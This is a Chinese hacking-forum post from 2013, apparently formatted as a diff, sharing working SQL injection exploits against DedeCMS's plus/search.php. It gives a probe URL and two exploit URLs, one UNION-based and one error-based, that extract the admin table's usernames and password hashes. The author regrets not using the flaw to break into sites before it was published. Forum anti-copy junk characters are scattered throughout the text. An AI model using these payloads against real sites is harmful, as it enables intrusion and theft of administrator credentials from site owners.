@@ -1,0 +1,42 @@
+原创】] [通杀]dedecms plus/search.php 注入漏洞利用方式
+本帖最后由 鬼哥 于 2013-1-20 00:43 编辑 
+
+90 Security Team转载不加作者名的没JJ
+90sec-国内后起的信息安全论坛之一,专注web安全,软件安全,无线安全等领域技术交流与讨论。我们以最大的努力为网络撑起一片蔚蓝的天空，同时也希望更多的技术爱好者加入我们。
+哎。没意识，我一个月前就发现了这个漏洞，一直也没去黑站  放那 现在狗卵的什么 知道创宇 发出来了。郁闷。。可惜了我的洞辛苦看了2天的dedecms漏洞就这样没了
+2 K! c# P' c! e% I/ g3 ~forum.90sec.org既然已经发出来了，我就把我自己搞的exp发下吧。。唉。
+$ {# q5 Y* a/ s; u% s90sec-国内后起的信息安全论坛之一,专注web安全,软件安全,无线安全等领域技术交流与讨论。我们以最大的努力为网络撑起一片蔚蓝的天空，同时也希望更多的技术爱好者加入我们。
+8 n0 g+ c; R; W( n$ P+ m: V90sec-国内后起的信息安全论坛之一,专注web安全,软件安全,无线安全等领域技术交流与讨论。我们以最大的努力为网络撑起一片蔚蓝的天空，同时也希望更多的技术爱好者加入我们。我一般是这样测试的：90sec& i7 V& t3 ^  Z6 N6 Y$ W( t
+提交 xx.com/plus/search.php?keyword=as&typeArr[1 uNion 1]=a forum.90sec.org6 S9 |# Q6 o$ [9 z- y
+
+0 |- P  F4 t- g, E - 专注信息安全作者：鬼哥
+
+看结果如果提示 - 专注信息安全7 U8 E3 H3 k& b2 t2 [9 i
+Safe Alert: Request Error step 2 ! 
+. w, M. l! A, o6 T& I/ `5 v) n - 专注信息安全那么直接用下面的exp
+
+xx.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
+
+9 k2 f2 i7 z6 t) F" z- c90sec   
+下载 (9.47 KB)
+前天 23:03
+90 Security Team) {: E( F+ S2 _" d6 j: f7 C
+
+. F+ ^: a0 I! |. M; m90 Security Team - 专注信息安全* j+ C6 o0 L# f4 S, \( [
+看结果如果提示
+
+secSafe Alert: Request Error step 1 ! 
+
+# R( h# U* D( W5 g' aforum.90sec.org那么直接用下面的
+
+exp
+% n+ v3 A/ S8 _forum.90sec.orgxx.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a - 专注信息安全  a( ~( z; s6 L0 C6 O# Y& n" B
+  
+下载 (96.57 KB)
+前天 23:03
+
+& g0 Z5 ]; k4 [0 _* _9 mforum.90sec.org
+3 c% l6 ^# z) U. s - 专注信息安全90sec+ t1 |3 X/ \6 n5 D$ T2 i
+如果正常显示证明漏洞不存在了。
+7 X5 R- a! {' @7 uforum.90sec.org - 专注信息安全* h+ d/ j' X( ]
+转载不加作者名的没JJ 
